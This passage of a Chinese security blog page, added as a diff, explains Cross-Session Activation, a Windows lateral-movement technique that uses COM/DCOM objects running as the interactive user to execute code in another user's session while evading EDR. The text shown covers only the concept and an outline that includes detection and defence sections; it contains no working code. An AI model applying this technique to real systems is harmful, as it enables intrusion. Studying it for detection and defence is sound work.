@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <style>
+        body
+        {
+            font-family: "Times New Roman", Helvetica, Tahoma, Arial,   "notoserifsc-medium", "Microsoft YaHei", "Hiragino Sans GB", "WenQuanYi Micro Hei", sans-serif !important;
+
+        }
+    </style>
+
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Cross-Session Activation（跨会话激活）技术文档" />
+    <meta name="hexo-theme-A4" content="v2.0.1" />
+    <link rel="alternate icon" type="image/webp" href="/null">
+    <title>CHANGMEN&#39;s Blog | Network Security Professional</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+
+         <!--注意：首页既不是post也不是page-->
+        
+
+        
+<link rel="stylesheet" href="/css/ui.css">
+
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+
+    
+<link rel="stylesheet" href="/css/lightgallery-bundle.min.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/custom.css">
+
+    
+
+    
+
+    <!-- <link rel="stylesheet" href="https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkai/dist/LXGWWenKai-Regular/result.css" /> -->
+    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/@chinese-fonts/lxgwwenkai@3.0.0/dist/LXGWWenKai-Regular/result.css' /> 
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    
+    
+        <style>
+            .index-main{
+                max-width:  880px;
+            }
+        </style>
+
+    
+    
+
+
+
+    
+
+    
+    
+
+
+
+
+    <style>
+        .archive-main a:hover {
+            text-decoration: none; 
+        }
+    </style>
+
+    
+    
+
+
+    <body>
+        
+        <script src="https://cdn.jsdelivr.net/npm/darkreader@4.9.80/darkreader.min.js"></script>
+        <script>
+            const drOptions = {
+                brightness: 100,
+                contrast: 95,
+                sepia: 10,
+                darkSchemeTextColor: '#e0e0e0',  // 粉笔白文字
+                darkSchemeBackgroundColor: '#1e1e1e', // 黑板灰背景
+                scrollbarStyle: 'native'
+            };
+
+            const savedTheme = localStorage.getItem('theme');
+            const systemDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+            if (savedTheme === 'dark' || (!savedTheme && systemDark)) {
+                DarkReader.enable(drOptions);
+            }
+
+            window.addEventListener('DOMContentLoaded', () => {
+                const btn = document.createElement('button');
+                btn.innerText = '🌓';
+                // 按钮样式：仿照你之前的布局，放在右下角
+                btn.style.cssText = `
+                    position: fixed; 
+                    bottom: 40px; 
+                    left: 42px; 
+                    z-index: 9999;
+                    width: 44px; 
+                    height: 44px; 
+                    border-radius: 50%; 
+                    border: 1px solid #ccc;
+                    background: #f7f5ed; 
+                    color: #000;
+                    font-size: 22px; 
+                    cursor: pointer;
+                    box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+                    transition: transform 0.2s, background-color 0.3s;
+                `;
+                // 根据当前状态初始化按钮颜色
+                if (DarkReader.isEnabled()) {
+                    btn.style.backgroundColor = '#1e1e1e';
+                    btn.style.color = '#fff';
+                }
+                btn.onmouseover = () => btn.style.transform = 'scale(1.1)';
+                btn.onmouseout = () => btn.style.transform = 'scale(1)';
+                document.body.appendChild(btn);
+                // 点击切换逻辑
+                btn.addEventListener('click', () => {
+                    if (DarkReader.isEnabled()) {
+                        DarkReader.disable();
+                        localStorage.setItem('theme', 'light');
+                        btn.style.backgroundColor = '#f7f5ed';
+                        btn.style.color = '#000';
+                    } else {
+                        DarkReader.enable(drOptions);
+                        localStorage.setItem('theme', 'dark');
+                        btn.style.backgroundColor = '#1e1e1e';
+                        btn.style.color = '#fff';
+                    }
+                });
+            });
+        </script>
+        
+        
+            
+                <div class="left-toc-container">
+                    <nav id="toc" class="bs-docs-sidebar"></nav>
+                </div>
+            
+        
+        <div class="paper">
+
+            
+
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <style>
+            .header-img {
+                width: 56px;
+                height: auto;
+                object-fit: cover; /* 保持图片比例 */
+                transition: transform 0.3s ease-in-out; 
+                border-radius: 0; 
+            }
+            
+        </style>
+        
+        <div class="header-content">
+            <a class="logo" href="/">CHANGMEN&#39;s Blog</a> 
+            <span class="description">CHANGMEN的个人博客，专注于网络安全领域。</span> 
+        </div>
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+    </ul>
+</div>
+
+                    
+                    
+
+                    
+                    
+
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+    
+
+    
+        
+            
+                <div class="post-main-title" style="text-align: center;">
+                    Cross-Session Activation（跨会话激活）技术文档
+                </div>
+            
+        
+      
+    
+
+    
+
+        
+            <div class="post-head-meta-center">
+        
+                
+                    <span>最近更新：2026-05-16</span> 
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                     <span>字数总计：7.7k</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span>阅读估时：31分钟</span>
+                
+                
+                    
+                        &nbsp; | &nbsp;
+                    
+                    <span id="busuanzi_container_page_pv">
+                        阅读量：<span id="busuanzi_value_page_pv"></span>次
+                    </span>
+                
+            </div>
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%80%E3%80%81%E6%8A%80%E6%9C%AF%E8%83%8C%E6%99%AF"><span class="post-toc-text">一、技术背景</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-1-%E4%BC%A0%E7%BB%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%9B%B0%E5%A2%83"><span class="post-toc-text">1.1 传统横向移动的困境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-2-Cross-Session-Activation-%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF"><span class="post-toc-text">1.2 Cross-Session Activation 的核心思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-3-%E4%B8%8E%E4%BC%A0%E7%BB%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB"><span class="post-toc-text">1.3 与传统横向移动的本质区别</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-4-CSA-%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%EF%BC%9A%E6%9C%AC%E5%9C%B0%E8%B7%A8%E4%BC%9A%E8%AF%9D-vs-%E8%BF%9C%E7%A8%8B%E8%B7%A8%E6%9C%BA%E5%99%A8"><span class="post-toc-text">1.4 CSA 的两种攻击场景：本地跨会话 vs 远程跨机器</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E6%9C%AC%E5%9C%B0%E8%B7%A8%E4%BC%9A%E8%AF%9D%EF%BC%88%E5%90%8C%E4%B8%80%E5%8F%B0%E6%9C%BA%E5%99%A8%EF%BC%89"><span class="post-toc-text">场景一：本地跨会话（同一台机器）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E8%BF%9C%E7%A8%8B%E8%B7%A8%E6%9C%BA%E5%99%A8%EF%BC%88%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%89"><span class="post-toc-text">场景二：远程跨机器（横向移动）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%B8%A4%E7%A7%8D%E5%9C%BA%E6%99%AF%E5%AF%B9%E6%AF%94"><span class="post-toc-text">两种场景对比</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B7%A8%E6%9C%BA%E5%99%A8%E7%9A%84%E5%AE%8C%E6%95%B4%E5%8E%9F%E7%90%86"><span class="post-toc-text">远程跨机器的完整原理</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BB%E7%9A%84%E6%A3%80%E6%B5%8B%E7%89%B9%E5%BE%81"><span class="post-toc-text">远程攻击的检测特征</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="post-toc-text">一句话总结</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BA%8C%E3%80%81Windows-COM-%E5%9F%BA%E7%A1%80"><span class="post-toc-text">二、Windows COM 基础</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-1-%E4%BB%80%E4%B9%88%E6%98%AF-COM%EF%BC%9F"><span class="post-toc-text">2.1 什么是 COM？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-2-CLSID-%E5%92%8C-AppID"><span class="post-toc-text">2.2 CLSID 和 AppID</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-3-RunAs-%E9%85%8D%E7%BD%AE%EF%BC%9A%E7%90%86%E8%A7%A3-CSA-%E7%9A%84%E5%9F%BA%E7%A1%80"><span class="post-toc-text">2.3 RunAs 配置：理解 CSA 的基础</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%89%E3%80%81Windows-%E4%BC%9A%E8%AF%9D%E6%9C%BA%E5%88%B6"><span class="post-toc-text">三、Windows 会话机制</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-1-%E4%BB%80%E4%B9%88%E6%98%AF%E4%BC%9A%E8%AF%9D%EF%BC%88Session%EF%BC%89%EF%BC%9F"><span class="post-toc-text">3.1 什么是会话（Session）？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-2-%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E4%BC%9A%E8%AF%9D"><span class="post-toc-text">3.2 如何查看会话</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-3-%E4%B8%BA%E4%BB%80%E4%B9%88%E2%80%9D%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BC%9A%E8%AF%9D%E2%80%9D%E6%98%AF%E5%89%8D%E6%8F%90%EF%BC%9F"><span class="post-toc-text">3.3 为什么”交互式会话”是前提？</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%9B%9B%E3%80%81CSA-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="post-toc-text">四、CSA 完整攻击流程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-1-%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="post-toc-text">4.1 前提条件</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E6%9C%AC%E5%9C%B0-CSA-%E7%9A%84%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="post-toc-text">场景一：本地 CSA 的前提条件</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E8%BF%9C%E7%A8%8B-CSA%EF%BC%88%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%EF%BC%89%E7%9A%84%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="post-toc-text">场景二：远程 CSA（横向移动）的前提条件</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-2-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="post-toc-text">4.2 完整攻击步骤</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-3-%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3"><span class="post-toc-text">4.3 步骤详解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E6%9E%9A%E4%B8%BE%E7%AC%A6%E5%90%88%E6%9D%A1%E4%BB%B6%E7%9A%84-COM-%E5%AF%B9%E8%B1%A1"><span class="post-toc-text">步骤 1：枚举符合条件的 COM 对象</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E6%9E%9A%E4%B8%BE%E7%9B%AE%E6%A0%87%E4%BC%9A%E8%AF%9D"><span class="post-toc-text">步骤 2：枚举目标会话</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E5%87%86%E5%A4%87%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="post-toc-text">步骤 3：准备执行环境</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E5%8F%91%E7%8E%B0%E5%8F%AF%E5%8A%AB%E6%8C%81%E8%B7%AF%E5%BE%84%EF%BC%88ComDiver%EF%BC%89"><span class="post-toc-text">步骤 4：发现可劫持路径（ComDiver）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-5%EF%BC%9A%E6%89%A7%E8%A1%8C-COM-%E5%8A%AB%E6%8C%81"><span class="post-toc-text">步骤 5：执行 COM 劫持</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E6%AD%A5%E9%AA%A4-6%EF%BC%9A%E6%BF%80%E6%B4%BB-COM-%E5%AF%B9%E8%B1%A1"><span class="post-toc-text">步骤 6：激活 COM 对象</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BA%94%E3%80%81%E4%B8%A4%E7%A7%8D%E5%88%A9%E7%94%A8%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3"><span class="post-toc-text">五、两种利用模式详解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-1-%E6%A8%A1%E5%BC%8F-A%EF%BC%9A%E5%88%A9%E7%94%A8-COM-%E5%AF%B9%E8%B1%A1%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%88%E5%A6%82-IHxHelpPaneServer%EF%BC%89"><span class="post-toc-text">5.1 模式 A：利用 COM 对象本身的方法（如 IHxHelpPaneServer）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-2-%E6%A8%A1%E5%BC%8F-B%EF%BC%9ACOM-%E5%8A%AB%E6%8C%81-DLL-%E5%8A%A0%E8%BD%BD%EF%BC%88%E5%A6%82-sppui%EF%BC%89"><span class="post-toc-text">5.2 模式 B：COM 劫持 + DLL 加载（如 sppui）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-3-%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="post-toc-text">5.3 两种模式对比</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-4-%E6%94%BB%E5%87%BB%E8%80%85%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%EF%BC%9F"><span class="post-toc-text">5.4 攻击者如何选择？</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%85%AD%E3%80%81%E5%85%B3%E9%94%AE-API-%E4%B8%8E%E6%8E%A5%E5%8F%A3%E8%A7%A3%E6%9E%90"><span class="post-toc-text">六、关键 API 与接口解析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-1-COM-%E6%BF%80%E6%B4%BB-API-%E9%93%BE"><span class="post-toc-text">6.1 COM 激活 API 链</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-2-%E4%BC%9A%E8%AF%9D%E6%9E%9A%E4%B8%BE-API"><span class="post-toc-text">6.2 会话枚举 API</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-3-COM-%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8-API"><span class="post-toc-text">6.3 COM 接口调用 API</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%83%E3%80%81IHxHelpPaneServer-%E7%9A%84-CVE-2024-38100"><span class="post-toc-text">七、IHxHelpPaneServer 的 CVE-2024-38100</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="post-toc-text">7.1 漏洞背景</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE"><span class="post-toc-text">7.2 漏洞利用链</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-3-%E4%B8%8E-CSA-%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="post-toc-text">7.3 与 CSA 的关系</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%85%AB%E3%80%81%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3"><span class="post-toc-text">八、检测方法详解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-1-%E6%A3%80%E6%B5%8B%E9%9A%BE%E7%82%B9"><span class="post-toc-text">8.1 检测难点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-2-%E6%A3%80%E6%B5%8B%E4%B8%80%EF%BC%9A%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA%E7%9B%91%E6%8E%A7%EF%BC%88Event-ID-4688%EF%BC%89"><span class="post-toc-text">8.2 检测一：进程创建监控（Event ID 4688）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HelpPane-exe-%E5%BC%82%E5%B8%B8%E5%AD%90%E8%BF%9B%E7%A8%8B%E6%A3%80%E6%B5%8B"><span class="post-toc-text">HelpPane.exe 异常子进程检测</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Defender-for-Endpoint-KQL-%E7%89%88%E6%9C%AC"><span class="post-toc-text">Defender for Endpoint KQL 版本</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%85%B6%E4%BB%96%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7"><span class="post-toc-text">其他异常进程监控</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-3-%E6%A3%80%E6%B5%8B%E4%BA%8C%EF%BC%9A%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%91%E6%8E%A7%EF%BC%88Event-ID-4663%EF%BC%89"><span class="post-toc-text">8.3 检测二：注册表监控（Event ID 4663）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%90%AF%E7%94%A8%E5%AE%A1%E8%AE%A1"><span class="post-toc-text">启用审计</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E9%94%81%E5%AE%9A%E7%9B%91%E6%8E%A7%E7%9A%84-CLSID"><span class="post-toc-text">锁定监控的 CLSID</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E7%9B%91%E6%8E%A7%E7%9A%84%E5%85%B3%E9%94%AE%E6%93%8D%E4%BD%9C"><span class="post-toc-text">监控的关键操作</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-4-%E6%A3%80%E6%B5%8B%E4%B8%89%EF%BC%9AAPI-%E9%92%A9%E5%AD%90%E7%9B%91%E6%8E%A7"><span class="post-toc-text">8.4 检测三：API 钩子监控</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-5-%E6%A3%80%E6%B5%8B%E5%9B%9B%EF%BC%9ASysmon-%E8%A7%84%E5%88%99"><span class="post-toc-text">8.5 检测四：Sysmon 规则</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8-6-%E6%A3%80%E6%B5%8B%E4%BA%94%EF%BC%9A%E8%A1%8C%E4%B8%BA%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90%EF%BC%88%E6%9C%80%E6%9C%89%E6%95%88%EF%BC%89"><span class="post-toc-text">8.6 检测五：行为关联分析（最有效）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B9%9D%E3%80%81%E6%95%B0%E6%8D%AE%E6%BA%90%E4%B8%8E%E6%A3%80%E6%B5%8B%E7%9F%A9%E9%98%B5"><span class="post-toc-text">九、数据源与检测矩阵</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8D%81%E3%80%81%E5%B7%A5%E5%85%B7%E6%B8%85%E5%8D%95"><span class="post-toc-text">十、工具清单</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="post-toc-text">十一、防御建议</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#11-1-%E5%87%8F%E5%B0%91%E6%94%BB%E5%87%BB%E9%9D%A2%EF%BC%88%E4%BA%8B%E5%89%8D%EF%BC%89"><span class="post-toc-text">11.1 减少攻击面（事前）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#11-2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%91%E6%8E%A7%EF%BC%88%E4%BA%8B%E4%B8%AD%EF%BC%89"><span class="post-toc-text">11.2 注册表监控（事中）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#11-3-%E8%BF%9B%E7%A8%8B%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7%EF%BC%88%E4%BA%8B%E4%B8%AD%EF%BC%89"><span class="post-toc-text">11.3 进程行为监控（事中）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#11-4-EDR-%E8%83%BD%E5%8A%9B%E9%AA%8C%E8%AF%81"><span class="post-toc-text">11.4 EDR 能力验证</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#11-5-SOC-%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C"><span class="post-toc-text">11.5 SOC 操作手册</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%8A%80%E6%9C%AF%E5%B1%80%E9%99%90%E6%80%A7"><span class="post-toc-text">十二、技术局限性</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B"><span class="post-toc-text">十三、技术演进</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="post-toc-text">参考资料</span></a></li></ol>
+            
+        
+        <div class=".article-gallery"><blockquote>
+<p>基于 <a target="_blank" rel="noopener" href="https://ipurple.team/2026/05/04/cross-session-activation/">ipurple.team</a> 的研究整理，结合 IHxExec &#x2F; SessionHop &#x2F; sppui 三个 PoC 进行深度解析</p>
+</blockquote>
+<hr>
+<h2 id="一、技术背景"><a href="#一、技术背景" class="headerlink" title="一、技术背景"></a>一、技术背景</h2><h3 id="1-1-传统横向移动的困境"><a href="#1-1-传统横向移动的困境" class="headerlink" title="1.1 传统横向移动的困境"></a>1.1 传统横向移动的困境</h3><p>传统的横向移动技术在 EDR 普及的今天面临严峻挑战：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">传统横向移动：</span><br><span class="line">  PSExec         → 创建服务进程 → EDR 检测到服务创建异常</span><br><span class="line">  WMI 远程执行   → WmiPrvSE.exe 子进程异常 → 被 EDR 关联</span><br><span class="line">  WinRM          → 新进程创建 + 命令行参数 → 被 EDR 拦截</span><br><span class="line">  SMB + PsExec    → 远程管道通信 → 网络层检测</span><br><span class="line"></span><br><span class="line">共同特点：</span><br><span class="line">  都需要&quot;远程连接 → 创建新进程 → 执行命令&quot;</span><br><span class="line">  这些行为在 EDR 中都有成熟的检测规则</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-Cross-Session-Activation-的核心思路"><a href="#1-2-Cross-Session-Activation-的核心思路" class="headerlink" title="1.2 Cross-Session Activation 的核心思路"></a>1.2 Cross-Session Activation 的核心思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CSA 的思路：</span><br><span class="line"></span><br><span class="line">  不需要&quot;远程连接&quot;（从网络层触发）</span><br><span class="line">  不需要&quot;创建新进程&quot;（从攻击者视角）</span><br><span class="line">  </span><br><span class="line">  而是：</span><br><span class="line">    利用 Windows COM/DCOM 机制</span><br><span class="line">    在【目标机器本地】激活一个 COM 对象</span><br><span class="line">    该 COM 对象被配置为 &quot;RunAs = Interactive User&quot;</span><br><span class="line">    → Windows 自动在交互式用户的会话中启动它</span><br><span class="line">    → 代码以目标用户的身份执行</span><br><span class="line">  </span><br><span class="line">  本质：让 Windows &quot;合法地&quot;帮你在另一个用户的会话里启动程序</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-与传统横向移动的本质区别"><a href="#1-3-与传统横向移动的本质区别" class="headerlink" title="1.3 与传统横向移动的本质区别"></a>1.3 与传统横向移动的本质区别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">传统横向移动：</span><br><span class="line">  攻击者 → 远程连接 → 创建新进程 → 在远程机器上执行</span><br><span class="line">  特征：有远程连接痕迹、有进程创建痕迹</span><br><span class="line"></span><br><span class="line">Cross-Session Activation：</span><br><span class="line">  攻击者 → 本地/远程 COM 激活 → Windows 自动在目标会话启动进程</span><br><span class="line">  特征：COM 调用是合法行为、进程启动由 Windows Loader 触发</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-CSA-的两种攻击场景：本地跨会话-vs-远程跨机器"><a href="#1-4-CSA-的两种攻击场景：本地跨会话-vs-远程跨机器" class="headerlink" title="1.4 CSA 的两种攻击场景：本地跨会话 vs 远程跨机器"></a>1.4 CSA 的两种攻击场景：本地跨会话 vs 远程跨机器</h3><p>CSA 不只是本地的”会话跳转”，它本质上就是一种横向移动技术，<strong>可以跨机器执行</strong>。关键在于 COM 的”兄弟”协议——DCOM（Distributed COM）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COM  = 本地进程间通信（Component Object Model）</span><br><span class="line">DCOM = 跨网络的进程间通信（Distributed COM）</span><br><span class="line"></span><br><span class="line">DCOM 是 Windows 内置的远程 COM 支持，不需要额外安装任何组件</span><br><span class="line">只要网络可达 + 有权限，就能远程激活目标机器上的 COM 对象</span><br></pre></td></tr></table></figure>
+
